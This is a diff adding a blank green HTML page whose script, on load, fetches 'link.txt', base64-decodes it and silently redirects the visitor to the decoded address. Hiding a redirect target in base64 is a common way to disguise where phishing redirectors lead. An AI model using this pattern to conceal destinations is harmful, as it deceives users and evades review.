@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: green; /* Set the background color to green */
+        }
+    </style>
+    <script>
+        // Function to fetch the Base64 link and redirect
+        window.onload = function() {
+            fetch('link.txt')
+                .then(response => response.text())
+                .then(base64Link => {
+                    // Decode the Base64 link
+                    const decodedLink = atob(base64Link.trim());
+                    // Redirect the user to the decoded link
+                    window.location.href = decodedLink;
+                })
+                .catch(error => console.error('Error fetching the link:', error));
+        };
+    </script>
+</head>
+<body>
+
+</body>
+</html>
